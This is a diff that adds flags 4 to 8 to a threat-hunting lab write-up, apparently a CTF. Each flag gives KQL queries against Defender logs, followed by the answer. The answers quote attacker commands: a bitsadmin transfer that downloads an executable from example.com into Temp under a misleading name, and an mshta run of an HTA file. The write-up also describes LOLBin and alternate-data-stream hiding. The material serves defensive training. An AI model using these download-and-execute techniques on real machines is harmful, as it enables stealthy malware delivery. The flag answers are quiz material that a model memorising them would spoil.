@@ -188,12 +188,185 @@ DeviceEvents
 
 ---
 
+## 🟩 Flag 4 – Last Manual Access to File
+
+**Objective:**
+
+Track last read of sensitive document.
+
+**What to Hunt:**
+
+Last file open timestamp.
+
+**Thought:**
+
+Late-stage access usually precedes exfiltration — timeline alignment matters.
 
 
+ 🕵️ **Identify the last instance of the file access**
+
+Query used: Same as flag 3
 
 
+🧠 **Thought process:** From the results seen in flag 3, I got the Timestamp of the last file access.
 
 
+<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>
+
+**Answer: 2025-06-16T06:12:28.2856483Z**
+
+---
+
+## 🟩 Flag 5 – LOLBin Usage: bitsadmin
+
+**Objective:**
+
+Identify stealth download via native tools.
+
+**What to Hunt:**
+
+bitsadmin.exe with file transfer URL.
+
+**Thought:**
+
+Abusing trusted binaries helps attackers blend in — keep an eye on LOLBins.
+
+
+ 🕵️ **Provide the command value associated with the initial exploit**
+
+Query used:
+
+```
+DeviceProcessEvents
+| where DeviceName == "michaelvm"
+| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
+| where FileName contains "bitsadmin.exe"
+| order by Timestamp asc
+```
+
+🧠 **Thought process:** I simply followed the hint and I got a straight answer in the logs.
+
+<img width="250" src="https://github.com/user-attachments/assets/fd161361-da91-49b7-b3b6-10a559c48896"/>
+
+**Answer: "bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe**
+
+---
+
+## 🟩 Flag 6 – Suspicious Payload Deployment
+
+**Objective:**
+
+Identify dropped executable payloads that do not align with baseline software.
+
+**What to Hunt:**
+
+New files placed in Temp or uncommon locations, especially with misleading names.
+
+**Thought:**
+
+Payloads must land before they run. Watch Temp folders for staging signs.
+
+**Hint:**
+
+1. Book of financial accounts
+
+ 🕵️ **Identify the suspicious program**
+
+Query used:
+
+```
+DeviceFileEvents
+| where DeviceName == "michaelvm"
+| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
+| where FileName endswith ".exe"
+| where FolderPath has_any ("\\Temp\\", "\\AppData\\", "\\ProgramData\\", "\\Users\\Public\\")
+| project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp asc
+```
+
+🧠 **Thought process:** I sorted the results by file name, that way it was easy to sift through the results and find the odd one out.
+
+<img width="400" src="https://github.com/user-attachments/assets/8f2dce56-934b-4bd4-95b2-32f67088554c"/>
+
+**Answer: ledger_viewer.exe**
+
+---
+
+## 🟩 Flag 7 – HTA Abuse via LOLBin
+
+**Objective:**
+
+Detect execution of HTML Application files using trusted Windows tools.
+
+**What to Hunt:**
+
+Execution via `mshta.exe` pointing to local HTA scripts.
+
+**Thought:**
+
+HTA-based execution is a social engineering favorite — it leverages trust and native execution.
+
+ 🕵️ **Provide the value of the command associated with the exploit**
+
+Query used:
+
+```
+DeviceProcessEvents
+| where DeviceName == "michaelvm"
+| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
+| where FileName =~ "mshta.exe"
+| where ProcessCommandLine has ".hta"
+| project Timestamp, ProcessCommandLine, InitiatingProcessFileName, FolderPath, SHA256
+| order by Timestamp asc
+```
+
+🧠 **Thought process:** The hints were good enough for me to find the results directly, where file name was mshta.exe and command line having .hta extensions
+
+<img width="600" src="https://github.com/user-attachments/assets/a0c40640-28f7-45bc-9314-2a502cfef238"/>
+
+**Answer: "mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta**
+
+---
+
+## 🟩 Flag 8 – ADS Execution Attempt
+
+**Objective:**
+
+Track if attackers stored payloads in Alternate Data Streams (ADS).
+
+**What to Hunt:**
+
+DLLs hidden in common file types like `.docx` with `:hidden.dll` behavior.
+
+**Thought:**
+
+ADS hides in plain sight — it’s a classic LOLBin trick to store malware where few would look.
+
+**Hint:**
+
+1. Capitalist
+
+ 🕵️ **Provide the SHA1 value associated**
+
+Query used:
+
+```
+DeviceProcessEvents
+| where DeviceName == "michaelvm"
+| where Timestamp between (datetime(2025-06-15) .. datetime(2025-06-19))
+| where InitiatingProcessCommandLine has ":"
+| where InitiatingProcessCommandLine has ".dll"
+| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA1
+| order by Timestamp desc
+```
+
+🧠 **Thought process:** I filtered for the command line having ":" and ".dll" in it, according to the hint. The compattelrunner.exe sounds like Capitalist so I figures it's the answer which is was. Upon further inspection into the command, I could see that Write-Host 'Final result: 1' command was run before the compattelrunner.exe scan. It's faking the result of a scan — potentially to mimic a real system check or mislead defenders. Then, the second command does the actual .inf scan. This staged behavior is often seen in malware to print fake result (decoy), actually scan system or possibly drop drivers or persistence tools.
+
+<img width="400" src="https://github.com/user-attachments/assets/97c83a1b-8bcc-4b15-ab39-c49512c362cd"/>
+
+**Answer: "801262e122db6a2e758962896f260b55bbd0136a**
+
+---
 
 
 
